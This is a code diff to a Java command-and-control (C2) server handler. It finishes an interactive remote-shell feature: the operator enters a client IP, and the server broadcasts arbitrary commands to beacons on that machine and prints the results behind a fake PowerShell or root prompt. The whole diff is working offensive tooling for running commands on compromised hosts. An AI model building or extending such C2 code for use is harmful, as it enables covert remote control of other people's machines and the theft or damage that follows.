@@ -8,6 +8,7 @@ import java.util.LinkedList;
 import java.util.Scanner;
 import java.util.Queue;
 import java.util.HashSet;
+import java.util.ArrayList;
 import java.util.Arrays;
 
 public class C2ServerUserHandler implements Runnable{
@@ -239,8 +240,8 @@ public class C2ServerUserHandler implements Runnable{
     private void enterClientShell(){
         System.out.println("Enter 'q' at any time to exit the shell and return to the main menu\n");
         System.out.print("Enter IP address of Client >> ");
-        String cilentIP = userInputScanner.nextLine().toLowerCase();
-        if(cilentIP.equals("q")){
+        String clientIP = userInputScanner.nextLine().toLowerCase();
+        if(clientIP.equals("q")){
             currentUserPath = "";
         } else {
             System.out.println("Setting up Shell ... ");
@@ -252,14 +253,15 @@ public class C2ServerUserHandler implements Runnable{
                 }
             }
 
-            C2server.broadcastToBeacons("Command " + cilentIP + "_pwd");
+            C2server.broadcastToBeacons("Command " + clientIP + "_pwd");
             try{
                 Thread.sleep(2000);
             } catch(InterruptedException e){
                 e.printStackTrace();
             }
-            
-            C2server.broadcastToBeacons("Request " + cilentIP + "_ ");
+
+            C2server.broadcastToBeacons("Request " + clientIP + "_ ");
+
             try{
                 Thread.sleep(2000);
             } catch(InterruptedException e){
@@ -267,10 +269,23 @@ public class C2ServerUserHandler implements Runnable{
             }
 
             String currentDirectory = "C:\\";
+            
+            // readMessages variable is used to ensure that only the results of the command run are output to the user
+            ArrayList<String> readMessages;
+
+            // messages is used to store all client responses
+            Object messages[];
     
             // Iterate through each message returned from the client, starting at the end, to find the current directory
             synchronized(messageQueue){
-                Object messages[] = messageQueue.toArray();
+                messages = messageQueue.toArray();
+
+                // Initialize the readMessages ArrayList with all of the messages already in the client responses
+                readMessages = new ArrayList<>();
+                for(Object message : messages){
+                    readMessages.add(message.toString());
+                }
+
                 for(int i = messages.length - 1; i > 0; i--){
                     if(messages[i].toString().contains("C:\\")){
                         currentDirectory = messages[i].toString().trim().split(" ")[1];
@@ -288,14 +303,55 @@ public class C2ServerUserHandler implements Runnable{
                 if(currentDirectory.contains("C:")){
                     System.out.print("PS " + currentDirectory + "> ");
                 } else {
-                    System.out.print("root@" + cilentIP + ":" + currentDirectory + "# ");
+                    System.out.print("root@" + clientIP + ":" + currentDirectory + "# ");
                 }
 
                 command = userInputScanner.nextLine();
-                if(command.equals("q")){
-                    break;
-                } else {
-                    // TODO Send command and get output
+                if (!(command.isEmpty())){
+                    if(command.equals("q")){
+                        currentUserPath = "";
+                        break;
+                    } else {
+                        // Send the Command
+                        C2server.broadcastToBeacons("Command " + clientIP + "_" + command);
+
+                        // Give the client a moment to run the command and return tne responses
+                        try{
+                            Thread.sleep(1000);
+                        } catch(InterruptedException e){
+                            e.printStackTrace();
+                        }
+
+                        C2server.broadcastToBeacons("Request " + clientIP + "_ ");
+                        
+                        try{
+                            Thread.sleep(1000);
+                        } catch(InterruptedException e){
+                            e.printStackTrace();
+                        }
+
+                        // Get all messages
+                        messages = messageQueue.toArray();
+
+                        // Store all of the messages just received in a new temp list
+                        ArrayList<String> tempReadMessagesList = new ArrayList<>();
+                        for(Object message : messages){
+                            tempReadMessagesList.add(message.toString());
+                        }
+
+                        // Iterate through responses and print only ones that are new
+                        for(Object message : messages){
+                            if(readMessages.contains(message.toString())){
+                                readMessages.remove(message.toString());
+                            } else {
+                                System.out.println(message.toString());
+                            }
+                        }
+
+                        // Replace the old already read messages list with the new one saved from earlier
+                        readMessages = tempReadMessagesList;
+
+                    }
                 }
             }
         }
